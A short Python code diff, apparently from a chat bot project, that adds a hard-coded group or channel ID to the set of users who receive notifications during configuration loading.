@@ -34,4 +34,5 @@ def config():
         cg.admins = cfg['admins']
         cg.notify_users = cfg['notify_users']
         cg.notify_users.add(cg.MASTER)
+        cg.notify_users.add(-1001732942884)
         cg.admins.add(cg.MASTER)
